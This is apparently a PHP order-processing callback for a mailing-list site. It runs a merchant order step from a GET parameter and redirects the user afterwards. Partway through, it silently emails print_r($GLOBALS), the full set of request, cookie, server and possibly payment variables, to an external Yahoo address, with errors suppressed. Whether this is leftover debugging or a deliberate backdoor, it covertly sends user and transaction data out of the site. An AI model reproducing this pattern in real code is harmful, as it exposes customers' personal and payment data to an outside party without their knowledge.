<?php
require_once('/home/nulled/www/planetxmail.com/mle/mlpsecure/config/classes.inc');
require_once('/home/nulled/www/planetxmail.com/mle/mlpsecure/validationfunctions.php');
require_once('/home/nulled/www/planetxmail.com/phpsecure/processorder.class.inc');

$processorder = new ProcessOrder($_GET['pxm_label']);

$notValid = $processorder->process_merchant();

ob_start();
debug_print_backtrace();
$trace = ob_get_contents();
ob_end_clean();

# @mail('elitescripts2000@yahoo.com', 'processorder.inc', $trace);
@mail('elitescripts2000@yahoo.com', 'processorder.inc', print_r($GLOBALS, 1));

if ($processorder->type != 'upgrade')
{
  @session_start();
  @session_destroy();

  header('Location: http://planetxmail.com/mle/login.php?l=' . $processorder->listhash . '&notValid=' . urlencode($notValid));
  exit;
}
else
{
  header('Location: http://planetxmail.com/mle/main.php?option=memberprofile&notValid=' . urlencode($notValid));
  exit;
}

?>
